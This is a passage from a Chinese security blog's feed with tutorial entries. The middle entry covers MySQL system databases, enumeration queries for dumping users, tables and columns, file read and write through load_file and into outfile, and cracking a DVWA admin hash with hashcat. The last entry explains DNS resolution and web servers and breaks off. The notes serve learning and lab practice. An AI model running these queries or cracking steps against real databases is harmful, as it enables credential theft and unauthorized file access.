href="https://www.jianshu.com/p/3fe7904683ac">SQL注入防御绕过——二次注入</a></p><p>[5] <a href="https://blog.csdn.net/helloc0de/article/details/76180190">SQL注入教程——（四）宽字节注入</a></p><p>[6] <a href="https://blog.csdn.net/qq_26406447/article/details/90643951">SQL Injection8(堆叠注入)——强网杯2019随便注</a></p><p>[7] <a href="https://blog.csdn.net/weixin_44032232/article/details/109262724">【渗透测试】DNSLog注入</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL默认库及读写文件</title>
      <link href="posts/36028.html"/>
      <url>posts/36028.html</url>
      
        <content type="html"><![CDATA[<h1 id="MySQL默认库"><a href="#MySQL默认库" class="headerlink" title="MySQL默认库"></a>MySQL默认库</h1><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ReAX6wu7mGhDbzE.png" alt="image-20201101161119257"></p><h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h2><p>在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，字段类型与访问权 限等。</p><p>查询数据库、表名、字段等信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 爆所有用户</span><br><span class="line">select group_concat(user) from mysql.user;</span><br><span class="line"> </span><br><span class="line"># 爆所有数据库</span><br><span class="line">select group_concat(SCHEMA_NAME) from information_schema.schemata;</span><br><span class="line"> </span><br><span class="line"># 爆当前数据库的表名</span><br><span class="line">select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database();</span><br><span class="line"> </span><br><span class="line"># 表中有主码约束，非空约束等完整性约束条件的情况下 爆表名</span><br><span class="line">select group_concat(table_name) from information_schema.table_constraints where table_schema&#x3D;database();</span><br><span class="line"> </span><br><span class="line"># 爆字段名(表名是 users，加引号或十六进制编码)</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;;</span><br><span class="line">select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x7573657273;</span><br><span class="line"> </span><br><span class="line"># 爆字段内容</span><br><span class="line">select first_name,password from users；</span><br></pre></td></tr></table></figure><h2 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h2><p>这个是mysql的核心数据库，类似于sql server中的master表，主要负责存储数据库的用户、权限设置、关键字等mysql自己需要使用的控制和管理信息。不可以删除，如果对mysql不是很了解，也不要轻易修改这个数据库里面的表信息。</p><h2 id="performance-schema"><a href="#performance-schema" class="headerlink" title="performance_schema"></a>performance_schema</h2><p>MySQL 5.5开始新增一个数据库：PERFORMANCE_SCHEMA，主要用于收集数据库服务器性能参数。并且库里表的存储引擎PERFORMANCE_SCHEMA，而用户是不能创建存储引擎为PERFORMANCE_SCHEMA的表。</p><h2 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h2><p>Sys库所有的数据源来自：performance_schema。目标是把performance_schema的把复杂度降低，让DBA能更好的阅读这个库里的内容，让DBA更快的了解DB的运行情况。（<a href="https://blog.csdn.net/jayewu/article/details/80183274">详情</a>）</p><h1 id="利用数据库的功能读写文件"><a href="#利用数据库的功能读写文件" class="headerlink" title="利用数据库的功能读写文件"></a>利用数据库的功能读写文件</h1><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>（1）数据库允许导入导出（secure_file_priv不为NULL）</p><p>查看数据库是否开启导入导出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#39;secure_file_priv&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/cHQ8D7LdrBCN3Ea.png" alt="image-20201113225818984"></p><p>   说明：secure_file_priv是用来限制load_file、load data和select  outfile操作哪个指定目录。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/yRk6KT1us85Jfhc.png" alt="img"></p><p>我这里默认是 <strong>/var/lib/mysql-files</strong> ,可以通过以下方式修改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf</span><br></pre></td></tr></table></figure><p>在最后添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure file priv&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure><p>重启mysql服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service mysql restart</span><br></pre></td></tr></table></figure><p>（2）当前用户的文件操作权限（File_priv：Y）</p><p>​     查看当前用户是否具有文件读写权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select File_priv from mysql.user where user&#x3D;&#39;root&#39; and host &#x3D;&#39;localhost&#39;;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/rQJSMWpgFqEn2P4.png" alt="image-20201113230842289"></p><h2 id="读文件（mysql导入数据）"><a href="#读文件（mysql导入数据）" class="headerlink" title="读文件（mysql导入数据）"></a>读文件（mysql导入数据）</h2><p><strong>(1)load_file()</strong></p><p><strong>(2)load data infile()</strong></p><p><strong>(3)system cat</strong></p><p>load_file()和load data infile读取文件的方法为:新建一个表，读取文件为字符串形式插入表中，然后读出表中数据。</p><p>system cat后加文件路径。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/U3DF2m1LXbCo7Zt.png" alt="image-20201113233615626"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ZAuskmMVWpbHn75.png" alt="image-20201113234015997"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201113234210769.png" alt="image-20201113234210769"></p><h2 id="写文件-mysql导出数据"><a href="#写文件-mysql导出数据" class="headerlink" title="写文件  (mysql导出数据)"></a>写文件  (mysql导出数据)</h2><p><strong>select ‘   ‘ into outfile</strong> </p><p>如：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/lCJvISb6Pezq8oE.png" alt="image-20201113234946913"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/yZDH4EV6ABao7OL.png" alt="image-20201113235046444"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/HZCNgiT9StwEM61.png" alt="image-20201114184126130"></p><h1 id="hash相关"><a href="#hash相关" class="headerlink" title="hash相关"></a>hash相关</h1><h2 id="查询用户hash"><a href="#查询用户hash" class="headerlink" title="查询用户hash"></a>查询用户hash</h2><p>目标：dvwa的admin用户的password</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/x9OkDFblViRWqjU.png" alt="image-20201115110152189"></p><p><a href="https://www.cmd5.com/">破解</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/2kzlbPJABgNnKGW.png" alt="image-20201115110328511"></p><h2 id="使用-hashcat-来对获取的-hash-进行暴力破解"><a href="#使用-hashcat-来对获取的-hash-进行暴力破解" class="headerlink" title="使用 hashcat 来对获取的 hash 进行暴力破解"></a>使用 hashcat 来对获取的 hash 进行暴力破解</h2><p><a href="https://hashcat.net/hashcat/">下载hashcat</a></p><p>在hashcat文件夹新建</p><p>hash.txt(保存要破解的hash值)</p><p>password.txt(保存密码字典)</p><p>使用cmd进入hashcat所在目录,用以下命令进行破解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 -m 0 hash.txt password.txt</span><br></pre></td></tr></table></figure><p>-a 0 代表使用字典破解模式</p><p>-m 0 代表Hash Type为md5</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/V2fysUPHAidRWc4.png" alt="image-20201115113529889"></p><p>结果：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/yW5AYkZS4PwIJmu.png" alt="image-20201115113724632"></p><p>破解记录在hashcat.potfile文件中可查</p><p>或可直接<strong>使用字典进行破解</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -a 0 5f4dcc3b5aa765d61d8327deb882cf99 password.txt</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/SJh5OiLlT92MH7X.png" alt="image-20201115114500987"></p><p>结果一致。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://blog.csdn.net/weixin_33991418/article/details/89744955">安装初始化mysql后，默认几个库介绍</a></p><p>[2] <a href="https://blog.csdn.net/WYJ____/article/details/81234382?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.channel_param">SQL注入读写文件</a></p><p>[3] <a href="https://blog.csdn.net/qq_34981272/article/details/99337529">数据库系统表相关学习</a></p><p>[4] <a href="https://blog.csdn.net/smli_ng/article/details/106111493">hashcat详细使用教程</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web页面解析流程的学习</title>
      <link href="posts/671.html"/>
      <url>posts/671.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>WEB 页面解析的总体流程</p><p>客户端（浏览器）发起页面请求，主机对 地址中的DNS 域名进行解析，找到对应的 IP 地址，请求发送到 服务端，服务器根据请求内容发送响应给客户端，客户端收到响应，将内容渲染成网页。</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201222181119855.png" alt="image-20201222181119855"></p><h1 id="域名解析的过程"><a href="#域名解析的过程" class="headerlink" title="域名解析的过程"></a>域名解析的过程</h1><h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><p>(1) <strong>域名</strong>：网络是基于TCP/IP协议进行通信和连接的，每一台主机都有唯一且固定的IP地址，从而区分因特网上数量庞大的主机。IP地址是数字型的，数字较多不方便记忆，于是人们又发明了域名地址，采用字符型结构。域名地址是域的自然语言名称，它与数字式IP地址存在一一对应的关系。IP地址如同电脑的身份证号码，而域名地址则相当于电脑的姓名，方便人们记忆和使用。域名一般由两个或两个以上的词构成，中间用“.”进行分隔，其结构是：四级域名.三级域名.二级域名.一级域名。</p><p>(2) <strong>DNS</strong>：<strong>域名系统</strong>（英语：<strong>D</strong>omain <strong>N</strong>ame <strong>S</strong>ystem，缩写：<strong>DNS</strong>）是互联网的一项服务。它作为将域名和IP地址相互映射的一个分布式数据库，能够使人更方便地访问互联网。DNS使用TCP和UDP端口53。当前，对于每一级域名长度的限制是63个字符，域名总长度则不能超过253个字符。</p><p><strong>DNS 服务器的分层结构</strong></p><p>DNS 服务器采用分布式、分层的方式部署在世界各地。按照层级从高到低，DNS 服务器分为：<code>根域名服务器</code>（Root DNS Servers）、<code>顶级域名服务器</code>（TLD DNS Servers）、<code>权威域名服务器</code>（Authoritative DNS Servers），层级关系如下图：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20201222181259372.png" alt="image-20201222181259372"></p><ul><li><code>根域名服务器</code>：世界上有 13 个 <code>根域名服务器</code>，准确来说是 13 组服务器群组，服务器组中的每一个<code>根域名服务器</code>都有所有<code>顶级域名服务器</code>（com, org, gov …）的 IP 地址。</li><li><code>顶级域名服务器</code>：为顶级域名如 com、org、net 等提供域名解析服务，每一个顶级域名都有相应的 <code>顶级域名服务器</code>，存放其所有子域名的 IP 地址。</li><li><code>权威域名服务器</code>：各种组织机构，如企业、学校、政府组织等都需为其提供网络服务的主机取一个合适的域名，如 百度公司的 baidu.com，而主机的 IP 地址和域名的对应关系就保存至其<code>权威域名服务器</code>中。一般大公司和学校都会部署自己的<code>权威域名服务器</code>。</li></ul><p>(3) <strong>域名解析</strong>：即域名到IP地址的转换过程。域名的解析工作由DNS服务器完成。DNS查询有两种方式：<strong>递归</strong>和<strong>迭代</strong>。DNS客户端设置使用的DNS服务器一般都是递归服务器，它负责全权处理客户端的DNS查询请求，直到返回最终结果。而DNS服务器之间一般采用迭代查询方式。</p><p><strong>递归查询</strong>：本机向本地域名服务器发出一次查询请求，就静待最终的结果。如果本地域名服务器无法解析，自己会以DNS客户机的身份向其它域名服务器查询，直到得到最终的IP地址告诉本机。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/DNS%E9%80%92%E5%BD%92%E6%9F%A5%E8%AF%A2%E5%AE%9E%E4%BE%8B.jpg"></p><p><strong>迭代查询</strong>：本地域名服务器向根域名服务器查询，根域名服务器告诉它下一步到哪里去查询，然后它再去查，每次它都是以客户机的身份去各个服务器查询。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/DNS%E8%BF%AD%E4%BB%A3%E6%9F%A5%E8%AF%A2%E5%AE%9E%E4%BE%8B.jpg"></p><h2 id="流程介绍"><a href="#流程介绍" class="headerlink" title="流程介绍"></a>流程介绍</h2><p>(1) <strong>浏览器输入域名之后，首先会检查浏览器缓存中是否缓存过该域名对应的IP地址</strong></p><p>用户通过浏览器浏览过某网站之后，浏览器就会自动缓存该网站域名对应的地址，当用户再次访问的时候，浏览器就会从缓存中查找该域名对应的IP地址，因为缓存不仅是有大小限制，而且还有时间限制（域名被缓存的时间通过属性来设置），所以存在域名对应的找不到的情况。当浏览器从缓存中找到了该网站域名对应的地址，那么整个解析过程结束，如果没有找到，将进行下一步骤。对于的缓存时间问题，不宜设置太长的缓存时间，时间太长，如果域名对应的发生变化，那么用户将在一段时间内无法正常访问到网站，如果太短，那么又造成频繁解析域名。</p><p>(2) <strong>如果在浏览器缓存中没有找到IP，那么将继续查找本机系统是否缓存过IP</strong></p><p>如果第一个步骤没有完成对域名的解析过程，那么浏览器会去系统缓存中查找系统是否缓存过这个域名对应的地址。其实操作系统也有一个域名解析的过程，通过<strong>hosts文件</strong>设置，用户可以将任何域名解析到任何能够访问的IP地址。正是因为有这种本地DNS解析的规程，所以有黑客就可能通过修改用户的域名来把特定的域名解析到他指定的IP地址上，导致这些域名被劫持。</p><p>(3) <strong>向本地域名解析服务系统发起域名解析的请求</strong></p><p>以上两步的解析是在本机上完成的，如果本机无法解析域名，那么系统只能请求本地域名解析服务系统进行解析，本地域名系统一般都是本地区的域名服务器，比如你连接的校园网，那么域名解析系统就在你的校园机房里，如果你连接的是电信、移动或者联通的网络，那么本地域名解析服务器就在本地区，由各自的运营商来提供服务。对于本地域名解析服务器，一般都缓存了地区内部域名解析请求的结果，如果缓存命中则返回相应的结果，当然缓存时间也受域名失效时间控制。大约80%的域名解析到这里就结束了，所以本地域名解析系统主要承担了域名的解析工作。</p><p>(4) <strong>向根域名解析服务器发起域名解析请求</strong></p><p>如果本地域名解析系统的缓存中没有所需要查找到域名，则将会向根域名服务器发起解析请求。</p><p>(5) <strong>根域名服务器返回给本地域名服务器一个所查询的主域名服务器（gTLD Server）地址</strong></p><p>根域名是不负责解析域名的，它只负责管理所有的顶级域名。比如：你要解析的网址是：<em><a href="http://www.xxx.com/">www.xxx.com</a></em>，根域名服务器是不知道这个域名的IP地址的，但是它知道这个IP在它管理的<code>.com</code>域名下，根域名服务器会向请求方发送<code>.com</code>域名服务器的地址，引导请求方继续查询。</p><p>(6) <strong>本地域名服务器LDNS再向上一步返回的gTLD服务器发送请求</strong></p><p>因为域名服务器之间会有大量的数据需要处理，所以DNS服务器之间一般采用迭代查询方式。本地域名解析服务器向gTLD服务器发起请求。</p><p>(7) <strong>gTLD服务器接收请求并返回Name Server服务器</strong></p><p>指定的域名由指定的Name Server服务器进行解析。</p><p>(8) <strong>Name Server服务器返回IP地址给本地服务器</strong></p><p>服务器查找域名对应的地址，将地址连同值返回给本地域名服务器。</p><p>(9) <strong>本地域名服务器缓存解析结果</strong></p><p>本地域名服务器缓存解析后的结果，缓存时间由TTL值控制。</p><p>(10) <strong>返回解析结果给用户</strong></p><p>解析结果将直接返回给用户，用户系统将缓存该地址，用户根据TTL值缓存在本地系统缓存中，域名解析过程结束。</p><h2 id="域名解析记录"><a href="#域名解析记录" class="headerlink" title="域名解析记录"></a>域名解析记录</h2><ul><li><p>A(Address)记录：用来指定主机名（或域名）对应的IP地址记录。</p></li><li><p>CNAME(别名)记录：即别名记录。这种记录允许您将多个名字映射到另外一个域名。通常用于同时提供WWW和MAIL服务的计算机。例如，有一台计算机名为“host.mydomain.com”（A记录）。它同时提供WWW和MAIL服务，为了便于用户访问服务。可以为该计算机设置两个别名（CNAME）：WWW和MAIL。这两个别名的全称就 <a href="http://www.mydomain.com/%E5%92%8C%E2%80%9Cmail.mydomain.com%E2%80%9D%E3%80%82%E5%AE%9E%E9%99%85%E4%B8%8A%E4%BB%96%E4%BB%AC%E9%83%BD%E6%8C%87%E5%90%91">http://www.mydomain.com/和“mail.mydomain.com”。实际上他们都指向</a> “host.mydomain.com”。</p></li><li><p>MX 记录： 邮件交换记录。它指向⼀个邮件服务器，⽤于电⼦邮件系统发邮<br>件时根据 收信⼈的地址后缀来定位邮件服务器。如：用户所用的邮件是以域名mydomain.com为结尾的，则需要在管理界面中添加该域名的MX记录来处理所有以@mydomain.com结尾的邮件。</p></li><li><p>NS(Name Server)记录：解析服务器记录。⽤来表明由哪台服务器对该域名进⾏解析。这⾥的NS<br>记录只对⼦域名⽣效。例如用户希望由12.34.56.78这台服务器解析news.mydomain.com，则需要设置news.mydomain.com的NS记录。 　　</p></li><li><p>TXT记录：⼀般指为某个主机名或域名设置的说明</p></li></ul><h1 id="web-页面请求的流程"><a href="#web-页面请求的流程" class="headerlink" title="web 页面请求的流程"></a>web 页面请求的流程</h1><h2 id="Web中间件"><a href="#Web中间件" class="headerlink" title="Web中间件"></a>Web中间件</h2><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>Nginx 性能稳定、功能丰富、运维简单、处理静态文件速度快且消耗系统资源极少。<br>1、相比 Apache，用 Nginx 作为 Web 服务器：使用资源更少，支持更多并发连接，效率更高。<br>2、作为负载均衡服务器：Nginx 既可在内部直接支持 Rails 和 PHP，也可支持作为 HTTP 代理服务器对外进行服务。Nginx 用 C 编写而成， 不论是系统资源开销还是 CPU 使用效率都比 Perlbal 要好的多。<br>3、作为邮件代理服务器：Nginx 同时也是一款非常优秀的邮件代理服务器（最早开发这个产品的目的之一，是作为邮件代理服务器）。</p><p>4、反向代理可以根据url将请求转向于不同用途的集群，比如图片请求，转向图片服务器集群；视频请求，转身视频服务器集群。</p><p>nginx是一款轻量级的web服务器/反向代理服务器/电子邮件代理服务器，安装非常简单，配置文件也很简洁（还支持 perl 语法）。Nginx 支持平滑加载新配置，还能够在不间断服务的情况下进行软件版本升级。</p><p><strong>#代理</strong></p><p>在Java设计模式中，代理模式是这样定义的：给某个对象提供一个代理对象，并由代理对象控制原对象的引用。</p><p>可能大家不太明白这句话，在举一个现实生活中的例子：比如我们要买一间二手房，虽然我们可以自己去找房源，但是这太花费时间精力了，而且房屋质量检测以及房屋过户等一系列手续也都得我们去办，再说现在这个社会，等我们找到房源，说不定房子都已经涨价了，那么怎么办呢？最简单快捷的方法就是找二手房中介公司（为什么？别人那里房源多啊），于是我们就委托中介公司来给我找合适的房子，以及后续的质量检测过户等操作，我们只需要选好自己想要的房子，然后交钱就行了。</p><p>代理简单来说，就是如果我们想做什么，但又不想直接去做，那么这时候就找另外一个人帮我们去做。那么这个例子里面的中介公司就是给我们做代理服务的，我们委托中介公司帮我们找房子。</p><ul><li><strong>正向代理</strong></li></ul><p>弄清楚什么是代理了，那么什么又是正向代理呢？</p><p>这里我再举一个例子：大家都知道，现在国内是访问不了 Google的，那么怎么才能访问 Google呢？我们又想，美国人不是能访问 Google吗（这不废话，Google就是美国的），如果我们电脑的对外公网 IP 地址能变成美国的 IP 地址，那不就可以访问 Google了。你很聪明，VPN 就是这样产生的。我们在访问 Google 时，先连上 VPN 服务器将我们的 IP 地址变成美国的 IP 地址，然后就可以顺利的访问了。</p><p>这里的 VPN 就是做正向代理的。正向代理服务器位于客户端和服务器之间，为了向服务器获取数据，客户端要向代理服务器发送一个请求，并指定目标服务器，代理服务器将目标服务器返回的数据转交给客户端。这里客户端是要进行一些正向代理的设置的。</p><ul><li><strong>反向代理</strong></li></ul><p>反向代理和正向代理的区别就是：<strong>正向代理代理客户端，反向代理代理服务器。</strong></p><p>反向代理，其实客户端对代理是无感知的，因为客户端不需要任何配置就可以访问，我们只需要将请求发送到反向代理服务器，由反向代理服务器去选择目标服务器获取数据后，在返回给客户端，此时反向代理服务器和目标服务器对外就是一个服务器，暴露的是代理服务器地址，隐藏了真实服务器IP地址。</p><p>下面我们通过两张图来对比正向代理和方向代理：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/nginx2.png"></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/nginx3.png"></p><p>理解这两种代理的关键在于代理服务器所代理的对象是什么，正向代理代理的是客户端，我们需要在客户端进行一些代理的设置。而反向代理代理的是服务器，作为客户端的我们是无法感知到服务器的真实存在的。</p><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p>1、Apache 是 LAMP 架构最核心的 Web Server，开源、稳定、模块丰富是 Apache 的优势。但 Apache 的缺点是有些臃肿，内存和 CPU 开销大，性能上有损耗，不如一些轻量级的 Web 服务器（譬如：Nginx、Tengine等）高效，轻量级的 Web 服务器对于静态文件的响应能力来说远高于 Apache 服务器。</p><p>2、Apache 做为 Web Server 是负载 PHP 的最佳选择，如果流量很大的话，可以采用 Nginx 来负载非 PHP 的 Web 请求。Nginx 是一个高性能的 HTTP 和反向代理服务器，Nginx 以其稳定、丰富功能集、示例配置文件和低系统资源的消耗而闻名。Nginx 现能支持 PHP 和 FastCGI，也支持负载均衡和容错，可和 Apache 配合使用，是轻量级的 HTTP 服务器的首选。</p><p>3、Web 服务器缓存也有多种方案，Apache 提供了自己的缓存模块，也可以使用外加的 Squid 模块进行缓存，这两种方式均可有效提高 Apache 的访问响应能力。Squid Cache 是一个 Web 缓存服务器，支持高效缓存，可作为网页服务器的前置 cache 服务器缓存相关请求以提高 Web 服务器速度。把 Squid 放在 Apache 的前端来缓存 Web 服务器生成动态内容，而 Web 应用程序只需要适当地设置页面实效时间即可。如访问量巨大，则可考虑使用 memcache 作为分布式缓存。</p><p>4、PHP 的加速可使用 eAccelerator 加速器，eAccelerator 是一个自由开放源码的 PHP 加速器。它会优化动态内容缓存，提高 PHP 脚本缓存性能，使 PHP 脚本在编译状态下，对服务器的开销几乎完全消除。它还可对脚本起优化作用，以加快其执行效率。 使 PHP 程序代码执效率可提高 1-10 倍。</p><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><p><strong>IIS</strong>是<strong>Internet</strong> <strong>Information</strong> <strong>Services</strong>的缩写，意为互联网信息服务，是由微软公司提供的基于 运行<strong>Microsoft</strong> <strong>Windows</strong>的互联网基本服务。 最初是<strong>Windows</strong> <strong>NT</strong>版本的可选包，随后内置在<strong>Windows</strong> 2000、<strong>Windows</strong> <strong>XP</strong> <strong>Professional</strong>和 <strong>Windows</strong> <strong>Server</strong> 2003一起发行，但在<strong>Windows</strong> <strong>XP</strong> <strong>Home</strong>版本上并没有<strong>IIS</strong>。 <strong>IIS</strong>是一种<strong>Web</strong>（网页）服务组件，其中包括<strong>Web</strong>服务器、<strong>FTP</strong>服务器、<strong>NNTP</strong>服务器和<strong>SMTP</strong>服务器， 分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网） 上发布信息成了一件很容易的事。 <strong>IIS</strong>最经典的版本是<strong>IIS6</strong>.0，最常见于<strong>Windows</strong> <strong>Server</strong> 2003系统中；<strong>IIS7</strong>.0则常见于 <strong>Windows</strong> <strong>Server</strong> 2008中。 目前（2017年）最新的版本是<strong>IIS10</strong>.0，常见于<strong>Windows</strong> <strong>Server</strong> 2016中。</p><h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><p>Tomcat（Apache Tomcat）是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun和其他公司及个人共同开发而成。</p><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。</p><p>对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应HTML（标准通用标记语言下的一个应用）页面的访问请求。</p><p>实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。</p><p>当配置正确时，Apache 为HTML页面服务，而Tomcat 实际上运行JSP 页面和Servlet。另外，Tomcat和IIS等Web服务器一样，具有处理HTML页面的功能。</p><p>另外它还是一个Servlet和JSP容器，独立的Servlet容器是Tomcat的默认模式。不过，Tomcat处理静态HTML的能力不如Apache服务器。</p><h2 id="Nginx的请求处理阶段"><a href="#Nginx的请求处理阶段" class="headerlink" title="Nginx的请求处理阶段"></a>Nginx的请求处理阶段</h2><p>Nginx 处理请求的过程一共划分为 11 个阶段，按照执行顺序依次是 post-read、server-rewrite、find-config、rewrite、post-rewrite、preaccess、access、post-access、try-files、content 以及 log。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/nginx1.png"></p><p><code>POST_READ</code> 读取HTTP头部，读取并解析内容</p><p><code>server-rewrite</code>在URL与location匹配之前修改请求的URL（重定向），在server块中的请求地址重写</p><p><code>find-config</code>配置查找阶段，根据请求的URL匹配location表达式；不支持nginx模块注册处理程序，而是由ngx_http_core_module模块来完成当前请求与location配置之间的匹配</p><p><code>rewrite</code>location块追踪的请求地址重写阶段，当rewrite指令用于location中则运行；ngx_lua模块中的set_by_lua指令和rewrite_by_lua指令也在这里</p><p><code>post-rewrite</code>请求地址重写提交阶段，防止递归修改URL造成死循环；由ngx_http_core_module模块实现</p><p><code>preaccess</code>访问权限检查准备阶段，http模块进入处理阶段，ngx_limit_req（访问控制的频率）和ngx_limit_zone（访问的并发率控制）也会运行</p><p><code>access</code>访问权限检查执行阶段，ngx_access和nginx_auth_request,ngx_lua的access-by_lua执行在这个阶段，配置指令多是执行访问控制性质的任务，比如检查用户的访问权限，检查用户的IP地址合法性</p><p><code>post-access</code>访问权限检查提交阶段，如果请求不被允许访问Nginx服务器，该阶段用于返回错误的响应</p><p><code>try-files</code>配置项try-files处理阶段，如果http访问的静态文件try-files配置项可以使这个请求顺序地访问多个静态文件，直至符合条件</p><p><code>content</code>内容产生阶段，大部分HTTP模块会执行，所有请求处理阶段中的重要阶段这个阶段的指令通常用来生成HTTP响应的内容</p><p><code>log</code>日志模块处理阶段，记录日志</p><h2 id="Apache的请求处理阶段"><a href="#Apache的请求处理阶段" class="headerlink" title="Apache的请求处理阶段"></a>Apache的请求处理阶段</h2><p>1、Post-Read-Request阶段: 在正常请求处理流程中，这是模块可以插入钩子的第一个阶段。对于那些想很早进入处理请求的模块来说，这个阶段可以被利用。</p><p>2、URI Translation阶段 : Apache在本阶段的主要工作：将请求的URL映射到本地文件系统。模块可以在这阶段插入钩子，执行自己的映射逻辑。mod_alias就是利用这个阶段工作的。</p><p>3、Header Parsing阶段 : Apache在本阶段的主要工作：检查请求的头部。由于模块可以在请求处理流程的任何一个点上执行检查请求头部的任务，因此这个钩子很少被使用。mod_setenvif就是利用这个阶段工作的。</p><p>4、Access Control阶段 : Apache在本阶段的主要工作：根据配置文件检查是否允许访问请求的资源。Apache的标准逻辑实现了允许和拒绝指令。mod_authz_host就是利用这个阶段工作的。</p><p>5、Authentication阶段 : Apache在本阶段的主要工作：按照配置文件设定的策略对用户进行认证，并设定用户名区域。模块可以在这阶段插入钩子，实现一个认证方法。</p><p>6、Authorization阶段 : Apache在本阶段的主要工作：根据配置文件检查是否允许认证过的用户执行请求的操作。模块可以在这阶段插入钩子，实现一个用户权限管理的方法。</p><p>7、MIME Type Checking阶段 : Apache在本阶段的主要工作：根据请求资源的MIME类型的相关规则，判定将要使用的内容处理函数。标准模块mod_negotiation和mod_mime实现了这个钩子。</p><p>8、FixUp阶段 : 这是一个通用的阶段，允许模块在内容生成器之前，运行任何必要的处理流程。和Post_Read_Request类似，这是一个能够捕获任何信息的钩子，也是最常使用的钩子。</p><p>9、Response阶段 : Apache在本阶段的主要工作：生成返回客户端的内容，负责给客户端发送一个恰当的回复。这个阶段是整个处理流程的核心部分。</p><p>10、Logging阶段 : 